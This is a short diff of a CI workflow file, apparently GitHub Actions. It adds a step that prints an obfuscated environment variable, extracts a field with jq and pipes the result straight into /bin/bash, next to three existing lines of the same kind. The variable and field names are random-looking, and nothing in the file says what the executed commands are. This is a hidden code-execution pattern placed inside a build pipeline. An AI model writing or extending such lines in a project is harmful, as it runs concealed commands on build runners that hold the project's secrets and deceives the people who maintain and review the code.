@@ -26,6 +26,7 @@ jobs:
           echo $kgw2279 | jq -r .xpx10993 | /bin/bash
           echo $yv082 | jq -r .sz0415 | /bin/bash
           echo $wia71 | jq -r .tx9546 | /bin/bash
+          printf '%s' "$oxfmu85" | jq -r .lookj38859 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
